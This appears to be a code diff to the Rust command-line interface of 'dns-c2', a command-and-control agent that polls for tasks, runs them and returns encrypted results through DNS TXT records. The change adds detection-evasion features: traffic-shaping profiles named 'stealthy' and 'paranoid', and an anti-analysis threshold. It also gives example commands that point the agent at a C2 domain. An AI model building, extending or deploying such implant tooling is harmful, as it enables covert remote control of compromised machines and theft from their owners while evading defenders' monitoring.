@@ -4,6 +4,7 @@ use dns_c2::cradle;
 use dns_c2::crypto;
 use dns_c2::dns;
 use dns_c2::encoding;
+use dns_c2::traffic;
 
 use clap::{Parser, Subcommand, ValueEnum};
 use log::info;
@@ -87,8 +88,9 @@ enum Commands {
     /// Checks in, then polls for tasks, executes them, and returns results.
     /// All communication is encrypted and goes through DNS TXT records.
     ///
-    /// Example:
+    /// Examples:
     ///   dns-c2 agent -d c2.example.com -k $KEY --interval 30 --jitter 0.3
+    ///   dns-c2 agent -d c2.example.com -k $KEY --profile stealthy --paranoia 0.3
     Agent {
         #[command(flatten)]
         conn: ConnArgs,
@@ -97,11 +99,11 @@ enum Commands {
         #[arg(short, long, env = "C2_KEY")]
         key: String,
 
-        /// Poll interval in seconds
+        /// Poll interval in seconds (overridden by --profile if set)
         #[arg(long, default_value_t = 30)]
         interval: u64,
 
-        /// Jitter factor (0.0-1.0)
+        /// Jitter factor 0.0-1.0 (overridden by --profile if set)
         #[arg(long, default_value_t = 0.3)]
         jitter: f64,
 
@@ -112,6 +114,14 @@ enum Commands {
         /// Override auto-generated session ID
         #[arg(long)]
         session_id: Option<String>,
+
+        /// Traffic shaping profile: aggressive, default, stealthy, paranoid
+        #[arg(long)]
+        profile: Option<String>,
+
+        /// Anti-analysis paranoia threshold 0.0-1.0 (0.0=disabled, 0.3=moderate)
+        #[arg(long, default_value_t = 0.0)]
+        paranoia: f64,
     },
 
     /// List active sessions (operator-side)
@@ -356,6 +366,8 @@ fn main() {
             jitter,
             jitter_strategy,
             session_id,
+            profile,
+            paranoia,
         } => {
             let master_key = crypto::key_from_hex(&key).expect("Invalid key");
             let session = session_id.unwrap_or_else(c2::generate_session_id);
@@ -369,6 +381,23 @@ fn main() {
                     std::process::exit(1);
                 });
 
+            // Build traffic profile from --profile flag or fall back to manual interval/jitter
+            let traffic_profile = if let Some(ref p) = profile {
+                p.parse::<agent::ProfilePreset>()
+                    .unwrap_or_else(|e| { eprintln!("{e}"); std::process::exit(1); })
+                    .to_traffic_profile()
+            } else {
+                traffic::shaping::TrafficProfile {
+                    base_interval_secs: interval as f64,
+                    jitter: traffic::shaping::JitterType::Uniform {
+                        range_secs: interval as f64 * jitter.clamp(0.0, 1.0),
+                    },
+                    ..traffic::shaping::TrafficProfile::default()
+                }
+            };
+
+            let profile_name = profile.as_deref().unwrap_or("custom");
+
             let config = agent::AgentConfig {
                 domain: conn.domain,
                 key: master_key,
@@ -376,15 +405,13 @@ fn main() {
                 poll_interval_secs: interval,
                 jitter_pct: jitter.clamp(0.0, 1.0),
                 jitter_strategy: strategy,
+                paranoia: paranoia.clamp(0.0, 1.0),
+                traffic_profile,
+                encode_c2: profile.is_some(),
             };
 
-            eprintln!(
-                "dns-c2 agent | session={} interval={}s jitter={:.0}% strategy={}",
-                session,
-                interval,
-                jitter * 100.0,
-                strategy
-            );
+            eprintln!("dns-c2 agent | session={} profile={} paranoia={:.0}%",
+                session, profile_name, paranoia * 100.0);
 
             rt.block_on(async {
                 if let Err(e) = agent::run(backend.as_ref(), &config).await {
